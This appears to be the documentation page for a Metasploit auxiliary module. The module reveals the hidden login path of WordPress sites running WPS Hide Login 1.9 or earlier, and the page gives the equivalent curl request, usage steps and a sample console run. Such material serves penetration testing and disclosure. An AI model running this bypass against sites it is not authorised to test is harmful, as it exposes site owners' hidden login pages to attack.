## Vulnerable Application

This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login
is used to make a new secret path to the login page, however a `GET` request to
`/wp-admin/options.php` with a `referer` will reveal the hidden path.

This emulates the following `curl` command: `curl --referer "something" -sIXGET http://<ip>/wp-admin/options.php`

## Verification Steps

1. Install the vulnerable plugin and set a new login page
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_wps_hide_login_revealer`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should find the hidden login page

## Options

## Scenarios

### WPS Hide Login version 1.9.0 on Wordpress 5.4.8 running on Ubuntu 20.04

```
resource (hide_login.rb)> use auxiliary/scanner/http/wp_wps_hide_login_revealer
resource (hide_login.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (hide_login.rb)> set verbose true
verbose => true
resource (hide_login.rb)> run
[*] Checking /wp-content/plugins/wps-hide-login/readme.txt
[*] Found version 1.9 in the plugin
[+] 1.1.1.1 - Vulnerable version detected
[*] 1.1.1.1 - Determining Login Page
[+] Login Page: http://1.1.1.1/supersecret/?redirect_to=%2Fwp-admin%2FilOYZU&reauth=1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
